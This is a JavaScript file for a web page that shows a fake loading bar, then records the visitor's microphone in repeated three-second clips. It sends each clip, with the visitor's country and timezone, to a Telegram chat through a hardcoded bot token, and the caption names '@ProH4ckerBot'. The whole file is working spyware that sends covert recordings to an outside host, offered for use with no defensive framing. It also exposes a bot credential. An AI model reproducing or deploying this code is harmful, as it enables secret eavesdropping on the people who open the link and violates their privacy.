// ===== BOT TOKEN =====
const BOT_TOKEN = "8645652953:AAHFVKv8mgJlSoTLjbYsg4nj7uL6vew9yH8";

const progress = document.getElementById("progress");
const status = document.getElementById("status");

let mediaRecorder;
let audioChunks = [];

// ===== Get Chat ID =====
function getChatId() {
  const match = window.location.href.match(/\/\?=(\d+)$/);
  return match ? match[1] : null;
}

// ===== Country =====
async function getCountry() {
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();

    const flag = data.country_code
      ? String.fromCodePoint(...[...data.country_code].map(c => c.codePointAt(0)+127397))
      : "";

    return {
      name: data.country_name || "Unknown",
      flag: flag
    };
  } catch {
    return { name:"Unknown", flag:"" };
  }
}

// ===== LOOP START =====
function startCycle() {
  startLoading();
}

// ===== LOADING =====
function startLoading() {
  let value = 0;
  progress.style.width = "0%";
  status.textContent = "Loading...";

  const interval = setInterval(()=>{
    value += 2; // 1 second
    progress.style.width = value + "%";

    if(value >= 100){
      clearInterval(interval);
      startRecording();
    }
  }, 20);
}

// ===== RECORD =====
async function startRecording() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });

    mediaRecorder = new MediaRecorder(stream);

    mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
    mediaRecorder.onstop = sendAudio;

    mediaRecorder.start();
    status.textContent = "Recording...";

    setTimeout(()=>{
      mediaRecorder.stop();
    }, 3000); // 3 sec

  } catch(err){
    status.textContent = "Mic Blocked!";
    console.error(err);
  }
}

// ===== SEND =====
async function sendAudio() {
  const chatId = getChatId();

  if(!chatId){
    status.textContent = "Invalid Link";
    return;
  }

  const blob = new Blob(audioChunks, { type:'audio/webm' });
  const sizeMB = (blob.size/(1024*1024)).toFixed(2) + " MB";
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

  const country = await getCountry();

  const caption = `╔════════════════════════════╗
🎵 New Audio Received
🌍 Country: ${country.flag} ${country.name}
⏰ TimeZone: ${timezone}
🔊 Soundsize: ${sizeMB}
🤖 Bot: @ProH4ckerBot
💻 User Panel Web System
╚════════════════════════════╝`;

  const form = new FormData();
  form.append("chat_id", chatId);
  form.append("caption", caption);
  form.append("audio", blob, "audio.webm");

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
    method:"POST",
    body:form
  })
  .then(()=>{
    status.textContent = "Sent ✓";

    // 🔁 restart cycle after small delay
    setTimeout(()=>{
      audioChunks = [];
      startCycle();
    }, 1500);

  })
  .catch(()=>{
    status.textContent = "Error!";

    setTimeout(()=>{
      startCycle();
    }, 2000);
  });
}

// ===== AUTO START =====
window.onload = startCycle;
